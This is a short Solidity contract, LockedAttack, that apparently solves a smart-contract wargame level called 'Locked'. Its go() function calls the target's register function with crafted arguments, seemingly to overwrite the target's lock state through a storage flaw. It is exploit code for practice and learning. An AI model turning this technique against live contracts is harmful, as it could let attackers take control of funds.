pragma solidity ^0.4.18;

interface Locked{
    function register(bytes32, address) public;
}

contract LockedAttack {
    
    address public target;
    
    function LockedAttack(address _addr) public{
        target = address(_addr);
    }
    
    function go() public {
        bytes32 name = bytes32(1);
        address addr = address(this);
        Locked(target).register(name, addr);
    }
}